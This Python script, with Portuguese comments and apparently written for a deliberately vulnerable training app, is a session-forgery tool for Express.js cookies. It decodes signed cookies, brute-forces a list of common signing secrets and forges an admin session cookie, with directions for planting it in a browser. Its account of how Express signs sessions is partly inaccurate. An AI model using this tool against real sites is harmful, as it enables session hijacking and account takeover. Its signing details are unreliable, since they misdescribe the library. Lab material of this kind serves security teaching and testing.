#!/usr/bin/env python3

"""
Session Cookie Decoder - Aplicação Vulnerável
Demonstra como decodificar cookies de sessão do Express.js
"""

import base64
import json
import hmac
import hashlib
import urllib.parse
import sys

# Chave secreta fraca da aplicação
SECRET_KEY = 'weak-secret-key'

def decode_session_cookie(signed_cookie, secret):
    """
    Decodifica um cookie de sessão do Express.js
    """
    try:
        # Remove prefixo 's:' se presente
        if signed_cookie.startswith('s:'):
            signed_cookie = signed_cookie[2:]
        
        # URL decode se necessário
        signed_cookie = urllib.parse.unquote(signed_cookie)
        
        # Separa valor da assinatura
        last_dot = signed_cookie.rfind('.')
        if last_dot == -1:
            raise ValueError('Cookie malformado - sem assinatura')
        
        value = signed_cookie[:last_dot]
        signature = signed_cookie[last_dot + 1:]
        
        # Verifica assinatura HMAC-SHA256
        expected_signature = hmac.new(
            secret.encode('utf-8'), 
            value.encode('utf-8'), 
            hashlib.sha256
        ).digest()
        
        # Converte para base64 URL-safe
        expected_signature = base64.b64encode(expected_signature).decode('utf-8')
        expected_signature = expected_signature.replace('=', '').replace('+', '-').replace('/', '_')
        
        if signature != expected_signature:
            print(f"⚠️  Assinatura inválida!")
            print(f"Esperado: {expected_signature}")
            print(f"Recebido: {signature}")
            return None
        
        # Decodifica base64
        decoded_bytes = base64.b64decode(value + '==')  # Padding
        decoded_str = decoded_bytes.decode('utf-8')
        
        # Parse JSON
        session_data = json.loads(decoded_str)
        
        return session_data
        
    except Exception as e:
        print(f"Erro ao decodificar cookie: {e}")
        return None

def create_fake_session_cookie(session_data, secret):
    """
    Cria um cookie de sessão falso
    """
    try:
        # Serializa dados
        json_data = json.dumps(session_data, separators=(',', ':'))
        
        # Codifica em base64
        encoded = base64.b64encode(json_data.encode('utf-8')).decode('utf-8')
        
        # Remove padding
        encoded = encoded.rstrip('=')
        
        # Cria assinatura HMAC-SHA256
        signature = hmac.new(
            secret.encode('utf-8'),
            encoded.encode('utf-8'),
            hashlib.sha256
        ).digest()
        
        # Converte para base64 URL-safe
        signature = base64.b64encode(signature).decode('utf-8')
        signature = signature.replace('=', '').replace('+', '-').replace('/', '_')
        
        return f"s:{encoded}.{signature}"
        
    except Exception as e:
        print(f"Erro ao criar cookie falso: {e}")
        return None

def brute_force_secret(signed_cookie):
    """
    Força bruta em chaves secretas comuns
    """
    common_secrets = [
        'weak-secret-key',
        'secret',
        'mysecret',
        'secretkey',
        'key',
        'password',
        '123456',
        'admin',
        'secret123',
        'keyboard-cat',
        'your-secret-key',
        'change-this-secret',
        'default-secret',
        'super-secret',
        'session-secret',
        'express-session-secret',
        'node-secret',
        'app-secret'
    ]
    
    print('🔓 Tentando força bruta nas chaves secretas comuns...\n')
    
    for secret in common_secrets:
        print(f'Testando chave: "{secret}"')
        result = decode_session_cookie(signed_cookie, secret)
        
        if result:
            print(f'✅ SUCESSO! Chave encontrada: "{secret}"\n')
            return {'secret': secret, 'session_data': result}
    
    print('❌ Nenhuma chave comum funcionou')
    return None

def extract_cookie_from_request(request_text):
    """
    Extrai cookie de sessão de um texto de requisição HTTP
    """
    lines = request_text.strip().split('\n')
    for line in lines:
        if line.lower().startswith('cookie:'):
            cookies = line.split(':', 1)[1].strip()
            # Procura por connect.sid
            for cookie in cookies.split(';'):
                cookie = cookie.strip()
                if cookie.startswith('connect.sid='):
                    return cookie.split('=', 1)[1]
    return None

def main():
    print('🔍 Session Cookie Decoder - Aplicação Vulnerável\n')
    
    if len(sys.argv) < 2:
        print('Uso: python3 session-decoder.py <cookie-value> [secret]')
        print('')
        print('Exemplos:')
        print('  # Decodificar com chave conhecida')
        print('  python3 session-decoder.py "s:eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn19.signature" weak-secret-key')
        print('')
        print('  # Força bruta automática')
        print('  python3 session-decoder.py "s:eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn19.signature"')
        print('')
        print('  # Criar cookie falso')
        print('  python3 session-decoder.py --create')
        print('')
        print('  # Extrair de requisição HTTP')
        print('  python3 session-decoder.py --extract "Cookie: connect.sid=s:valor.signature"')
        return
    
    cookie_value = sys.argv[1]
    
    # Modo de criação
    if cookie_value == '--create':
        session_data = {
            "user": {
                "id": 1,
                "username": "hacker",
                "role": "admin"
            }
        }
        fake_cookie = create_fake_session_cookie(session_data, SECRET_KEY)
        
        print('🎭 Cookie falso criado:')
        print('Dados:', json.dumps(session_data, indent=2))
        print('Cookie:', fake_cookie)
        print('')
        print('💡 Para usar: substitua o valor do cookie connect.sid no navegador')
        return
    
    # Modo de extração
    if cookie_value == '--extract':
        if len(sys.argv) < 3:
            print('Erro: Forneça o texto da requisição HTTP')
            return
        
        extracted = extract_cookie_from_request(sys.argv[2])
        if extracted:
            print(f'🔍 Cookie extraído: {extracted}\n')
            cookie_value = extracted
        else:
            print('❌ Não foi possível extrair o cookie')
            return
    
    # Decodificação
    result = None
    
    if len(sys.argv) >= 3 and sys.argv[1] != '--extract':
        # Usar chave fornecida
        secret = sys.argv[2]
        print(f'🔑 Usando chave secreta: "{secret}"\n')
        session_data = decode_session_cookie(cookie_value, secret)
        result = {'secret': secret, 'session_data': session_data} if session_data else None
    else:
        # Força bruta automática
        result = brute_force_secret(cookie_value)
    
    if result:
        print('📋 DADOS DA SESSÃO DECODIFICADOS:')
        print('=' * 40)
        print('Chave secreta:', result['secret'])
        print('Dados da sessão:')
        print(json.dumps(result['session_data'], indent=2))
        
        if 'user' in result['session_data']:
            user = result['session_data']['user']
            print('\n👤 INFORMAÇÕES DO USUÁRIO:')
            print('ID:', user.get('id'))
            print('Username:', user.get('username'))
            print('Role:', user.get('role'))
        
        print('\n🚨 VULNERABILIDADES IDENTIFICADAS:')
        print('- Chave secreta fraca e previsível')
        print('- Cookie não HTTPOnly completo')
        print('- Dados sensíveis no cookie')
        print('- Possível Session Fixation')
        print('- Session Hijacking possível')
        
    else:
        print('❌ Não foi possível decodificar o cookie')

if __name__ == '__main__':
    main()